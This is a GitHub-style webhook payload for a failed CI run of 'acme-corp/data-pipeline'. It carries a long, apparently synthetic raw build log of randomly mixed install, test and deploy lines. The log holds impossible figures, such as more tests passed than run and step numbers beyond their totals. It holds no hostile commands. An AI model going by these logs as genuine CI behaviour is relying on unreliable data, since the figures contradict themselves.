{
  "action": "completed",
  "workflow_run": {
    "id": 75,
    "name": "CI Pipeline",
    "head_branch": "feature/feat-803",
    "head_sha": "07cd8b315f8946be6a926cf48c3f3d5b33fb989a",
    "status": "completed",
    "conclusion": "failure",
    "run_started_at": "2025-12-15T12:45:59.384977Z",
    "updated_at": "2025-12-15T12:49:30.701471Z"
  },
  "repository": {
    "full_name": "acme-corp/data-pipeline",
    "name": "data-pipeline"
  },
  "sender": {
    "login": "henry"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: setup_environment ===\n[12:45:59] DEBUG: Connection pool: 12 active\nReady.\nEnvironment: production\nArtifact uploaded: build.tar.gz (5MB)\nCompiling lib/handler.rs...\nCompiling src/utils.go...\nConnection established\nWARNING: lodash has known vulnerabilities\nWaiting...\npip: Collecting prettier\n[12:45:59] DEBUG: Connection pool: 13 active\nArtifact uploaded: dist.zip (7MB)\nImage pulled successfully\nStep 3/20: Testing\n[12:45:59] INFO: Starting build process\nEnvironment: staging\nProcessing...\nCreating production build...\nOptimizing 43 modules...\nSnapshots: 25 passed, 27 total\nOptimizing 21 modules...\nTLS handshake completed\nStep 3/25: Linting\nCache restored successfully (26MB)\nConnection established\n[12:45:59] INFO: Starting build process\nArtifact downloaded: 41MB\nPOST /upload - 200 (322ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 All checks passed\npip: Downloading axios-5.16.tar.gz\n\u2717 build failed with exit code 44\nArtifact uploaded: dist.zip (35MB)\nnpm install: added 427 packages\nCache saved successfully\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:45:59] INFO: Processing request\nnpm notice: created a lockfile\n[12:45:59] INFO: Request completed\nCompiling components/handler.rs...\nFetching submodules...\nArtifact uploaded: dist.zip (37MB)\nCompiling src/app.ts...\nFetching from https://googleapis.com/package.json\n  PASS: unit/test_user_create.spec.js\nPOST /data - 201 (364ms)\nConnection established\npip install: Successfully installed react-4.2\nBundling main.css\nDone.\nReady.\nCache invalidated: build\nCache restored successfully (155MB)\nFetching from https://registry.npmjs.org/package.json\nImage pulled successfully\nNODE_ENV=test\nEnvironment: production\nTime: 22.719s\n\u2713 Step 'checkout' succeeded\n  PASS: e2e/test_db_connect.spec.js\nPulling image: python:latest\nImage pulled successfully\nWARNING: jest has known vulnerabilities\n[12:45:59] WARN: Deprecated API usage\nSuccess!\nBuilding Docker image...\nPlatform: linux-x64\n[12:45:59] INFO: Connecting to database\nCache restored successfully (144MB)\nWaiting...\nImage pulled successfully\n[12:45:59] ERROR: Connection failed\nRan 184 tests in 26s\nPOST /api - 202 (168ms)\nCache saved successfully\nnpm install: added 321 packages\nnpm install: resolved 1137 packages\n  PASS: test_cache_hit (319ms)\nFAILED: test_api_health\nArtifact downloaded: 44MB\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nAlready up to date.\nStep 1/20: Installing dependencies\n\u2713 Step 'test' succeeded\nnpm install: resolved 1388 packages\nnpm install: added 25 packages\nDone.\nGenerating source maps...\nWaiting...\n\u2717 build failed with exit code 31\n[12:45:59] DEBUG: Loading configuration\n[12:45:59] INFO: Cache refreshed\nnpm install: resolved 1243 packages\nTLS handshake completed\nFetching from https://docker.io/package.json\nCache saved successfully\nSwitched to branch 'bugfix/task-295'\n[12:45:59] DEBUG: Query executed in 31ms\nCache restored successfully (361MB)\n\u2713 validate completed\npip: Installing build dependencies...\nCache saved successfully\n  PASS: test_cache_hit (496ms)\nTime: 49.920s\n\u2713 All checks passed\nStep 9/20: Linting\n[12:45:59] INFO: Cache refreshed\nCompiling lib/handler.rs...\nConnection established\nTime: 61.134s\n[12:45:59] DEBUG: Query executed in 6ms\nWaiting...\nUsing Python 3.9\n[12:45:59] WARN: Deprecated API usage\n[12:45:59] INFO: Starting build process\nUsing Node.js 14.16.4\nCompiling utils/utils.go...\nMinifying main.js\nTransforming 895 files...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\npip: Installing build dependencies...\nUsing Python 3.10\nReady.\nHEAD is now at bac8851\nOptimizing 77 modules...\n\u2713 All checks passed\nChecking out main branch\nCompleted.\nUploading artifact 'dist' (34 files)\n  PASS: e2e/test_auth_login.spec.js\nConnection established\nLoading...\n[12:45:59] WARN: Deprecated API usage\npip: Collecting prettier\nCache invalidated: node_modules\nWARNING: lodash has known vulnerabilities\n[12:45:59] WARN: Deprecated API usage\nTLS handshake completed\n  PASS: test_auth_login (60ms)\n\u2713 Task completed in 3988ms\nStep 16/19: Deploying\n[12:45:59] WARN: Deprecated API usage\nStep 18/15: Deploying\n=== Step setup_environment completed ===\n=== Step: integration_tests ===\npip: Downloading express-4.12.tar.gz\npip install: Successfully installed webpack-2.18\nNODE_ENV=production\nVerifying...\nnpm install: added 265 packages\nGenerating source maps...\nnpm notice: created a lockfile\nCompiling utils/service.java...\nStep 19/16: Testing\nRan 85 tests in 15s\nCreating production build...\nTest Suites: 22 passed, 25 total\nnpm notice: package.json updated\nTLS handshake completed\nTLS handshake completed\nVerifying...\nChecking out develop branch\nMinifying app.js\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCreating production build...\nPulling image: alpine:3.11\nRan 70 tests in 33s\nCompleted.\nLayer 10/14: RUN command\nPushing to registry...\nPulling image: python:18\n[12:45:59] INFO: Request completed\nOK\nnpm notice: package.json updated\nNODE_ENV=development\nHEAD is now at 720e625\nFAILED: test_db_connect\npip: Installing build dependencies...\n\u2713 All checks passed\nRan 85 tests in 60s\nEnvironment: test\nWARNING: webpack has known vulnerabilities\nCompiling utils/service.java...\n[12:45:59] DEBUG: Memory usage: 613MB\nCache restored successfully (477MB)\nStep 19/21: Running migrations\nnpm install: added 241 packages\nStep 8/21: Deploying\n[12:45:59] ERROR: Connection failed\npip: Installing build dependencies...\n[12:45:59] WARN: Deprecated API usage\nUploading artifact 'build' (41 files)\nCompiling lib/utils.go...\nStep 2/19: Testing\nnpm notice: created a lockfile\nyarn add: Done in 17.70s\nChecking out main branch\nCache hit for key-1095\nCache miss for key-4956\nCoverage: 85% statements, 61% branches\n[12:45:59] DEBUG: Memory usage: 1841MB\nCompiling components/main.py...\nRan 44 tests in 14s\nStep 19/19: Building\nFetching from https://pypi.org/package.json\nFetching from https://docker.io/package.json\nPushing to registry...\nUsing Python 3.9\n\u2713 Task completed in 1726ms\nFAILED: test_cache_hit\nSwitched to branch 'feature/task-777'\nSuccess!\nCompiling utils/handler.rs...\n[12:45:59] INFO: Cache refreshed\nCache miss for key-5135\nNODE_ENV=development\nProcessing...\nStep 13/19: Building\nStep 11/19: Deploying\nWARNING: axios has known vulnerabilities\npip: Installing build dependencies...\npip: Downloading prettier-3.8.tar.gz\nBundling main.css\n[12:45:59] DEBUG: Loading configuration\nCoverage: 89% statements, 72% branches\nStep 1/20: Building\nCoverage: 82% statements, 97% branches\nTest Suites: 9 passed, 9 total\nProcessing...\nFetching submodules...\nCoverage: 91% statements, 62% branches\npip: Collecting axios\nTime: 19.481s\n[12:45:59] INFO: Connecting to database\nCompleted.\nGET /status - 201 (71ms)\nLayer 7/11: COPY command\nPulling image: node:3.11\npip install: Successfully installed lodash-4.8\n\u2717 build failed with exit code 11\nCache restored successfully (152MB)\n\u2713 test completed\nException: TypeError\nUsing Python 3.12\nLayer 9/9: ENV command\nWaiting...\nGenerating source maps...\nChecking out main branch\nOptimizing 91 modules...\nArtifact uploaded: dist.zip (60MB)\nSnapshots: 8 passed, 33 total\nChecking out develop branch\nPOST /upload - 202 (238ms)\n[12:45:59] INFO: Cache refreshed\npip: Installing build dependencies...\npip: Collecting express\nnpm notice: created a lockfile\nStep 13/17: Linting\n[12:45:59] DEBUG: Initializing service\n[12:45:59] DEBUG: Initializing service\nGET /health - 201 (51ms)\nChecking out master branch\nAlready up to date.\n[12:45:59] DEBUG: Query executed in 26ms\nChecking out master branch\nPushing to registry...\nPOST /data - 200 (384ms)\n[12:45:59] DEBUG: Loading configuration\nConnection established\nFetching from https://githubusercontent.com/package.json\npip install: Successfully installed axios-2.1\nPlatform: win32-x64\nRan 32 tests in 38s\npip: Installing build dependencies...\nArtifact uploaded: build.tar.gz (33MB)\nTLS handshake completed\nCompiling src/main.py...\nWARNING: react has known vulnerabilities\nCache miss for key-2352\n\u2713 lint completed\nProcessing...\n[12:45:59] WARN: Deprecated API usage\nCompiling utils/handler.rs...\nnpm notice: package.json updated\n\u26a0 DEPRECATION: Feature will be removed in v4.0\npip: Downloading express-3.20.tar.gz\npip: Collecting lodash\nyarn add: Done in 2.15s\nAlready up to date.\n=== Step integration_tests completed ===\n=== Step: e2e_tests ===\nTime: 42.937s\nSnapshots: 5 passed, 48 total\n\u2713 Task completed in 1763ms\nFAILED: test_user_create\nCache restored successfully (496MB)\nCache miss for key-6067\n[12:45:59] DEBUG: Initializing service\nVerifying...\nOptimizing 62 modules...\nCompleted.\nnpm notice: created a lockfile\n[12:45:59] INFO: Connecting to database\nUsing Python 3.10\nBuilding Docker image...\n[12:45:59] ERROR: Connection failed\n[12:45:59] DEBUG: Memory usage: 936MB\npip: Downloading express-5.17.tar.gz\npip install: Successfully installed webpack-5.11\n[12:45:59] DEBUG: Loading configuration\nStep 18/23: Building\n  PASS: test_cache_hit (95ms)\nStep 5/16: Building\nPOST /api - 202 (381ms)\nPulling image: alpine:3.11\nSnapshots: 49 passed, 33 total\nnpm notice: package.json updated\nFinished.\nStep 6/20: Linting\nStep 12/20: Testing\nPlatform: darwin-arm64\nVerifying...\nInstalling react@4.13.5\nLoading...\n  PASS: unit/test_user_create.spec.js\n\u2713 Step 'build' succeeded\nNODE_ENV=development\n\u2713 All checks passed\nCache saved successfully\nFetching from https://githubusercontent.com/package.json\n[12:45:59] INFO: Processing request\n[12:45:59] DEBUG: Query executed in 85ms\nReady.\n[12:45:59] WARN: Deprecated API usage\nNODE_ENV=production\nCache miss for key-8835\nCreating production build...\n[12:45:59] WARN: Deprecated API usage\npip install: Successfully installed lodash-2.19\nCache restored successfully (296MB)\n[12:45:59] DEBUG: Loading configuration\nWaiting...\nDone.\nCompleted.\nSuccess!\nConnection established\nPlatform: win32-x64\nNODE_ENV=development\nSuccess!\nCache invalidated: node_modules\nTLS handshake completed\nStep 3/21: Testing\nStep 4/21: Building\nBuilding Docker image...\nWARNING: lodash has known vulnerabilities\nGenerating source maps...\nTLS handshake completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nFAILED: test_user_create\npip: Downloading express-5.20.tar.gz\nWARNING: eslint has known vulnerabilities\nSnapshots: 15 passed, 1 total\nArtifact uploaded: build.tar.gz (6MB)\nBuilding Docker image...\nPulling image: alpine:18\nNODE_ENV=development\n\u2713 Step 'checkout' succeeded\nVerifying...\nStep 3/24: Installing dependencies\nFAILED: test_user_create\nCompiling components/index.js...\nTime: 85.764s\npip: Collecting lodash\nReady.\nPlatform: win32-x64\nBuilding Docker image...\nWARNING: react has known vulnerabilities\n[12:45:59] DEBUG: Loading configuration\nnpm install: resolved 966 packages\nBundling vendor.css\npip: Downloading express-1.9.tar.gz\nCompiling utils/utils.go...\nMinifying app.js\nStep 5/15: Building\nWARNING: jest has known vulnerabilities\nNODE_ENV=development\nFAILED: test_api_health\nMinifying app.js\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:45:59] ERROR: Connection failed\n[12:45:59] DEBUG: Query executed in 45ms\n[12:45:59] INFO: Connecting to database\nWaiting...\n[12:45:59] ERROR: Connection failed\nPulling image: alpine:18\nUsing Python 3.11\n\u2713 Step 'test' succeeded\n[12:45:59] DEBUG: Connection pool: 10 active\nArtifact uploaded: dist.zip (87MB)\n\u2717 build failed with exit code 109\nTLS handshake completed\nHEAD is now at 03b9ee9\nWaiting...\nLayer 10/13: RUN command\nLayer 8/9: ENV command\n[12:45:59] WARN: Deprecated API usage\nCompiling utils/handler.rs...\n\u2713 Task completed in 275ms\nUsing Node.js 20.0.2\nFinished.\nStep 10/23: Installing dependencies\nPlatform: darwin-arm64\nAlready up to date.\nOptimizing 39 modules...\nArtifact uploaded: dist.zip (94MB)\nyarn add: Done in 3.42s\n[12:45:59] INFO: Request completed\nCache restored successfully (455MB)\nHEAD is now at ec1e86e\n\u2713 validate completed\nProcessing...\nEnvironment: test\nChecking out master branch\nLoading...\nCache hit for key-3171\nUsing Python 3.9\nLoading...\nHEAD is now at af535f5\nCompiling utils/utils.go...\npip install: Successfully installed axios-3.1\nUsing Node.js 16.7.2\nLoading...\nOK\nProcessing...\n=== Step e2e_tests completed ===\n=== Step: build ===\nReady.\nNODE_ENV=development\n[12:45:59] DEBUG: Memory usage: 828MB\nUsing Node.js 19.10.5\nAlready up to date.\npip: Collecting jest\nException: TypeError\npip: Downloading lodash-4.18.tar.gz\nStep 18/16: Testing\nWARNING: jest has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nFetching from https://npmjs.org/package.json\npip: Installing build dependencies...\nReady.\nArtifact uploaded: build.tar.gz (12MB)\nSwitched to branch 'hotfix/task-201'\nCache miss for key-9995\nConnection established\nCache invalidated: dependencies\nWARNING: react has known vulnerabilities\n\u2713 Step 'build' succeeded\nBundling runtime.js\n[12:45:59] DEBUG: Initializing service\nEnvironment: test\nOptimizing 93 modules...\n[12:45:59] WARN: Deprecated API usage\nUsing Python 3.10\nStep 20/19: Testing\nArtifact downloaded: 33MB\nVerifying...\n[12:45:59] DEBUG: Initializing service\nSnapshots: 7 passed, 36 total\nCache saved successfully\nFAILED: test_user_create\nTransforming 310 files...\nRan 134 tests in 57s\nArtifact uploaded: dist.zip (10MB)\nUsing Node.js 17.13.4\nStep 20/19: Installing dependencies\nnpm install: resolved 266 packages\n[12:45:59] DEBUG: Initializing service\n[12:45:59] DEBUG: Loading configuration\npip: Collecting jest\nnpm notice: package.json updated\nCompleted.\nTests: 202 passed, 107 total\npip install: Successfully installed prettier-2.2\nProcessing...\nFetching submodules...\nSnapshots: 21 passed, 42 total\n\u2713 All checks passed\nnpm notice: created a lockfile\n\u2717 build failed with exit code 93\nUsing Node.js 18.2.8\n\u2713 Task completed in 2152ms\n\u2713 Task completed in 2991ms\n\u2713 deploy completed\nMinifying main.js\nBundling runtime.css\nNODE_ENV=development\nTest Suites: 20 passed, 5 total\n[12:45:59] WARN: Deprecated API usage\nNODE_ENV=development\n\u2713 Task completed in 3152ms\nTest Suites: 23 passed, 42 total\nPOST /upload - 202 (192ms)\nProcessing...\npip: Collecting lodash\nTime: 114.812s\nPulling image: alpine:latest\nEnvironment: production\nCompleted.\nFinished.\n[12:45:59] WARN: Deprecated API usage\nPOST /upload - 201 (408ms)\nCompiling src/app.ts...\nChecking out master branch\n[12:45:59] DEBUG: Memory usage: 380MB\nInstalling lodash@2.10.4\n\u2713 All checks passed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nnpm notice: created a lockfile\nTests: 67 passed, 255 total\nChecking out master branch\nUsing Python 3.12\nLayer 4/13: RUN command\n[12:45:59] DEBUG: Initializing service\nVerifying...\nPlatform: darwin-arm64\n  PASS: test_user_create (139ms)\nPulling image: alpine:3.11\nConnection established\nInstalling axios@2.16.7\nBuilding Docker image...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTLS handshake completed\n  PASS: unit/test_cache_hit.spec.js\n[12:45:59] WARN: Deprecated API usage\nEnvironment: test\nSnapshots: 26 passed, 49 total\n[12:45:59] DEBUG: Initializing service\nCompiling src/service.java...\n[12:45:59] INFO: Cache refreshed\nCreating production build...\nMinifying vendor.js\nPushing to registry...\n[12:45:59] INFO: Processing request\nStep 7/24: Deploying\nyarn add: Done in 22.16s\nStep 7/21: Linting\n  PASS: test_auth_login (268ms)\nnpm install: added 282 packages\nTransforming 820 files...\nGenerating source maps...\nWARNING: jest has known vulnerabilities\n[12:45:59] INFO: Connecting to database\nRan 120 tests in 48s\nStep 6/21: Running migrations\nInstalling axios@5.7.4\n[12:45:59] WARN: Deprecated API usage\nWARNING: express has known vulnerabilities\nWARNING: jest has known vulnerabilities\nOptimizing 47 modules...\nDone.\nVerifying...\n\u2713 Step 'build' succeeded\npip: Downloading axios-5.8.tar.gz\n[12:45:59] INFO: Connecting to database\nCache invalidated: dependencies\n[12:45:59] INFO: Processing request\nImage pulled successfully\nChecking out master branch\n\u2713 build completed\nArtifact uploaded: build.tar.gz (40MB)\nStep 10/17: Linting\nAlready up to date.\nDone.\n[12:45:59] DEBUG: Initializing service\nTests: 490 passed, 399 total\nStep 7/19: Installing dependencies\n[12:45:59] ERROR: Connection failed\nArtifact uploaded: dist.zip (88MB)\nInstalling prettier@5.9.5\npip install: Successfully installed jest-5.9\n=== Step build completed ===\n=== Step: setup_node ===\nConnection established\nStep 6/22: Deploying\n\u2717 build failed with exit code 8\n\u2713 All checks passed\nSnapshots: 14 passed, 32 total\nCache invalidated: build\n[12:45:59] DEBUG: Initializing service\nCompiling src/main.py...\nCompiling components/handler.rs...\nImage pulled successfully\nnpm install: added 476 packages\nRan 97 tests in 53s\n\u2713 package completed\n[12:45:59] DEBUG: Memory usage: 967MB\nStep 14/21: Building\nDone.\nInstalling react@5.4.4\nReady.\n[12:45:59] INFO: Cache refreshed\nFinished.\nTLS handshake completed\nBundling styles.css\npip: Collecting react\nBuilding Docker image...\n\u2713 Step 'checkout' succeeded\nStep 4/21: Linting\n[12:45:59] INFO: Request completed\nCoverage: 92% statements, 90% branches\n[12:45:59] DEBUG: Loading configuration\n\u2713 Step 'setup' succeeded\nCompleted.\nAlready up to date.\n[12:45:59] INFO: Cache refreshed\nStep 18/19: Deploying\nPOST /upload - 201 (216ms)\nnpm install: added 201 packages\nTLS handshake completed\npip: Installing build dependencies...\nPushing to registry...\nSuccess!\n[12:45:59] WARN: Deprecated API usage\n\u2713 Task completed in 166ms\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nPOST /upload - 201 (61ms)\nBuilding Docker image...\nCompleted.\nCoverage: 95% statements, 94% branches\nGenerating source maps...\n[12:45:59] DEBUG: Query executed in 91ms\n[12:45:59] DEBUG: Connection pool: 6 active\nOptimizing 38 modules...\nCache restored successfully (114MB)\n\u2717 build failed with exit code 32\nTLS handshake completed\n[12:45:59] DEBUG: Connection pool: 2 active\nAlready up to date.\nCache invalidated: dependencies\n\u2713 All checks passed\nCreating production build...\nStep 14/25: Linting\n[12:45:59] WARN: Deprecated API usage\nTime: 56.994s\nyarn add: Done in 30.31s\n[12:45:59] INFO: Processing request\nVerifying...\nUploading artifact 'dist' (14 files)\n[12:45:59] INFO: Request completed\n[12:45:59] DEBUG: Initializing service\nCompiling src/service.java...\nCompleted.\nCompiling src/main.py...\nProcessing...\n[12:45:59] INFO: Processing request\n\u2713 Task completed in 4239ms\nSnapshots: 19 passed, 3 total\nSwitched to branch 'hotfix/task-807'\nException: RuntimeError\nWaiting...\nUsing Python 3.10\nTLS handshake completed\nVerifying...\n[12:45:59] INFO: Starting build process\nSwitched to branch 'feature/task-706'\npip: Downloading express-5.8.tar.gz\nStep 4/15: Running migrations\nTransforming 159 files...\n[12:45:59] DEBUG: Initializing service\nImage pulled successfully\n\u2717 build failed with exit code 117\n[12:45:59] DEBUG: Connection pool: 4 active\n[12:45:59] ERROR: Connection failed\nUsing Python 3.11\n[12:45:59] DEBUG: Connection pool: 5 active\nGET /health - 204 (17ms)\n[12:45:59] DEBUG: Initializing service\nArtifact uploaded: dist.zip (14MB)\nnpm install: added 472 packages\n\u2713 deploy completed\nnpm install: added 81 packages\nReady.\nStep 8/19: Testing\nStep 18/16: Linting\nCache hit for key-7005\nStep 7/22: Installing dependencies\npip: Installing build dependencies...\nLayer 5/8: COPY command\nTests: 134 passed, 325 total\nnpm notice: package.json updated\nHEAD is now at 04fc539\n[12:45:59] DEBUG: Memory usage: 832MB\n\u2713 Step 'test' succeeded\nInstalling express@4.8.4\nArtifact downloaded: 31MB\nSnapshots: 9 passed, 34 total\n[12:45:59] DEBUG: Initializing service\nConnection established\n[12:45:59] DEBUG: Initializing service\nSnapshots: 16 passed, 4 total\nBuilding Docker image...\nSnapshots: 25 passed, 19 total\nCache restored successfully (174MB)\nSuccess!\n[12:45:59] DEBUG: Memory usage: 1499MB\nCache saved successfully\nInstalling eslint@5.0.4\nInstalling lodash@4.20.0\nCompleted.\nAlready up to date.\nWaiting...\nCompiling components/service.java...\nStep 7/17: Building\nTests: 442 passed, 327 total\nProcessing...\nBundling styles.css\nLoading...\npip: Installing build dependencies...\nUsing Node.js 19.14.9\nyarn add: Done in 6.38s\nOptimizing 91 modules...\nBuilding Docker image...\nCompleted.\nWaiting...\nTLS handshake completed\nCoverage: 84% statements, 76% branches\n=== Step setup_node completed ===\n=== Step: deploy_production ===\nTransforming 561 files...\nTransforming 888 files...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 5/25: Linting\n\u2713 Task completed in 4222ms\nCoverage: 81% statements, 75% branches\npip: Downloading express-1.17.tar.gz\nEnvironment: development\nSwitched to branch 'bugfix/task-934'\nOptimizing 40 modules...\nPOST /data - 201 (232ms)\nCompiling components/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCoverage: 92% statements, 87% branches\nOptimizing 37 modules...\n[12:45:59] WARN: Deprecated API usage\nHEAD is now at 9ea0d9e\nCompleted.\npip install: Successfully installed prettier-3.14\nFetching submodules...\n[12:45:59] INFO: Starting build process\nSnapshots: 1 passed, 31 total\nUsing Node.js 16.8.6\npip: Installing build dependencies...\nOptimizing 26 modules...\nArtifact uploaded: dist.zip (64MB)\nChecking out main branch\nCache restored successfully (495MB)\nPushing to registry...\nVerifying...\nPulling image: python:3.11\nSwitched to branch 'bugfix/task-983'\nStep 6/16: Installing dependencies\npip install: Successfully installed eslint-1.17\nCompiling lib/handler.rs...\nBundling main.js\nCompiling utils/service.java...\nFinished.\nGenerating source maps...\nStep 1/24: Running migrations\npip install: Successfully installed prettier-1.18\n[12:45:59] INFO: Connecting to database\nException: TypeError\nUploading artifact 'dist' (3 files)\nSuccess!\nInstalling react@3.14.1\nCache miss for key-9835\nnpm install: resolved 637 packages\n[12:45:59] INFO: Connecting to database\nMinifying app.js\n[12:45:59] DEBUG: Loading configuration\nHEAD is now at ba70881\n[12:45:59] INFO: Connecting to database\n[12:45:59] DEBUG: Initializing service\nUploading artifact 'dist' (30 files)\n  PASS: e2e/test_auth_login.spec.js\nVerifying...\nAlready up to date.\nCache miss for key-8644\nException: ValueError\nPOST /data - 202 (190ms)\nCompiling utils/utils.go...\nSnapshots: 47 passed, 17 total\nSwitched to branch 'feature/task-622'\nBuilding Docker image...\nCache miss for key-4468\nWARNING: react has known vulnerabilities\nnpm install: resolved 1297 packages\nConnection established\nFAILED: test_db_connect\nVerifying...\nStep 6/17: Building\nCreating production build...\nImage pulled successfully\n[12:45:59] DEBUG: Loading configuration\nCache invalidated: node_modules\nGenerating source maps...\n[12:45:59] INFO: Connecting to database\nCompiling lib/utils.go...\nBuilding Docker image...\nHEAD is now at afa976a\n[12:45:59] DEBUG: Connection pool: 11 active\nLoading...\n\u2717 build failed with exit code 51\nStep 12/17: Linting\nUsing Python 3.10\nCache hit for key-5148\nnpm install: resolved 476 packages\n[12:45:59] DEBUG: Connection pool: 7 active\nLoading...\n\u2713 Task completed in 4365ms\nTransforming 731 files...\n[12:45:59] INFO: Processing request\nInstalling prettier@1.3.1\nOK\nnpm notice: package.json updated\n[12:45:59] DEBUG: Connection pool: 2 active\nnpm notice: package.json updated\nPushing to registry...\nCache restored successfully (234MB)\nCache invalidated: node_modules\nCompiling lib/main.py...\nDone.\n[12:45:59] WARN: Deprecated API usage\nImage pulled successfully\nNODE_ENV=development\n[12:45:59] INFO: Processing request\nWaiting...\nAlready up to date.\nFinished.\n[12:45:59] INFO: Starting build process\nLoading...\nTests: 106 passed, 297 total\nReady.\nCompiling lib/app.ts...\nStep 5/16: Testing\nInstalling jest@5.3.2\n[12:45:59] DEBUG: Connection pool: 17 active\n[12:45:59] DEBUG: Connection pool: 19 active\npip: Installing build dependencies...\nReady.\nWaiting...\nLoading...\nStep 1/18: Linting\nArtifact downloaded: 18MB\npip: Downloading react-2.4.tar.gz\n\u2713 Task completed in 4896ms\nFetching submodules...\nSuccess!\nnpm install: added 435 packages\nDone.\n  PASS: test_cache_hit (44ms)\nArtifact uploaded: build.tar.gz (42MB)\nCache hit for key-2649\nPulling image: python:3.11\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:45:59] INFO: Request completed\nCompiling src/index.js...\nTransforming 990 files...\n[12:45:59] INFO: Processing request\nUsing Node.js 16.3.1\nSnapshots: 22 passed, 10 total\nUploading artifact 'build' (28 files)\nArtifact uploaded: build.tar.gz (28MB)\n=== Step deploy_production completed ===\n=== Step: unit_tests ===\nCompiling components/app.ts...\nVerifying...\nFinished.\nWARNING: express has known vulnerabilities\nTLS handshake completed\nSwitched to branch 'bugfix/task-568'\nnpm notice: created a lockfile\nInstalling axios@1.13.10\nCompleted.\nLoading...\nnpm install: added 358 packages\nUploading artifact 'build' (29 files)\nFAILED: test_auth_login\nOptimizing 33 modules...\nGET /api - 200 (3ms)\nWARNING: express has known vulnerabilities\nReady.\nCache saved successfully\nWARNING: lodash has known vulnerabilities\n[12:45:59] DEBUG: Initializing service\nStep 16/17: Building\nReady.\n[12:45:59] WARN: Deprecated API usage\n[12:45:59] WARN: Deprecated API usage\nnpm notice: created a lockfile\nSwitched to branch 'bugfix/task-123'\nDone.\nProcessing...\nLoading...\nTLS handshake completed\nMinifying app.js\nAlready up to date.\nTests: 163 passed, 291 total\nPulling image: python:18\n[12:45:59] INFO: Starting build process\nPushing to registry...\nAlready up to date.\nOptimizing 74 modules...\nChecking out main branch\nGenerating source maps...\nCache miss for key-2593\nFAILED: test_api_health\n  PASS: test_cache_hit (325ms)\nWARNING: express has known vulnerabilities\nCache hit for key-8344\nUsing Node.js 15.13.10\nArtifact uploaded: dist.zip (40MB)\nSnapshots: 11 passed, 13 total\n[12:45:59] ERROR: Connection failed\nnpm install: resolved 1311 packages\nCompiling utils/index.js...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nGenerating source maps...\nCache invalidated: dependencies\nBundling main.js\nWARNING: webpack has known vulnerabilities\n[12:45:59] INFO: Processing request\n\u2713 Step 'checkout' succeeded\nCreating production build...\n[12:45:59] DEBUG: Connection pool: 13 active\nArtifact uploaded: build.tar.gz (30MB)\nCompiling lib/handler.rs...\npip: Collecting jest\nPulling image: node:18\nOK\n[12:45:59] ERROR: Connection failed\nEnvironment: development\nCompiling src/app.ts...\n\u2713 Task completed in 3773ms\n\u2713 Step 'checkout' succeeded\nnpm install: added 287 packages\nNODE_ENV=development\nCache saved successfully\n[12:45:59] INFO: Starting build process\nChecking out main branch\nCache invalidated: node_modules\n[12:45:59] DEBUG: Initializing service\nVerifying...\nStep 4/22: Deploying\n[12:45:59] INFO: Connecting to database\nChecking out master branch\n\u2713 Step 'build' succeeded\n[12:45:59] DEBUG: Connection pool: 8 active\nOK\nBundling runtime.js\nCache hit for key-8034\nHEAD is now at 6362d9b\nTransforming 714 files...\nStep 17/22: Running migrations\n  PASS: e2e/test_auth_login.spec.js\nTime: 108.313s\nLayer 6/11: RUN command\nStep 5/15: Linting\nHEAD is now at 83c70c5\npip install: Successfully installed eslint-3.12\nStep 8/21: Installing dependencies\n[12:45:59] DEBUG: Initializing service\nDone.\nArtifact uploaded: build.tar.gz (20MB)\nnpm notice: created a lockfile\npip install: Successfully installed react-1.0\nArtifact uploaded: build.tar.gz (45MB)\nTransforming 334 files...\npip: Downloading prettier-1.17.tar.gz\npip: Installing build dependencies...\n\u2713 Step 'install' succeeded\nTest Suites: 46 passed, 50 total\nUsing Python 3.11\npip: Installing build dependencies...\nUsing Python 3.12\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nUploading artifact 'build' (11 files)\n\u2713 Task completed in 2814ms\nnpm notice: created a lockfile\n[12:45:59] WARN: Deprecated API usage\nOptimizing 49 modules...\nWaiting...\nCache restored successfully (131MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nFinished.\n\u2713 Task completed in 2607ms\nTLS handshake completed\nArtifact uploaded: build.tar.gz (26MB)\n\u2713 Task completed in 820ms\nnpm install: resolved 297 packages\nTransforming 500 files...\nWaiting...\n\u2713 Step 'install' succeeded\nConnection established\n[12:45:59] DEBUG: Connection pool: 7 active\nCreating production build...\nGET /health - 204 (22ms)\nWARNING: express has known vulnerabilities\nDone.\nWARNING: express has known vulnerabilities\nTests: 268 passed, 68 total\nPulling image: python:latest\nCompiling lib/index.js...\nUsing Python 3.11\nCache invalidated: node_modules\nException: ValueError\n[12:45:59] DEBUG: Query executed in 21ms\nNODE_ENV=production\nWaiting...\n=== Step unit_tests completed ===\n=== Step: restore_cache ===\nUsing Node.js 16.15.5\nGenerating source maps...\nStep 6/16: Installing dependencies\nArtifact uploaded: dist.zip (42MB)\nOK\n\u2713 validate completed\npip: Installing build dependencies...\nCache miss for key-6530\nUploading artifact 'coverage' (23 files)\nNODE_ENV=test\nCache saved successfully\n\u2713 All checks passed\nReady.\nGET /api - 201 (1ms)\nUsing Node.js 16.7.5\nCache invalidated: build\npip: Installing build dependencies...\n[12:45:59] DEBUG: Query executed in 69ms\nCompiling lib/handler.rs...\nCompiling lib/service.java...\nPushing to registry...\nCache saved successfully\nCompiling components/service.java...\nArtifact downloaded: 48MB\nCache saved successfully\nInstalling eslint@3.4.5\nStep 19/22: Testing\nCompiling components/service.java...\nnpm install: resolved 149 packages\nChecking out master branch\nConnection established\nReady.\n[12:45:59] INFO: Cache refreshed\nStep 18/17: Linting\nEnvironment: production\nSwitched to branch 'hotfix/task-282'\n[12:45:59] DEBUG: Initializing service\nCache invalidated: node_modules\nEnvironment: production\nEnvironment: development\n[12:45:59] 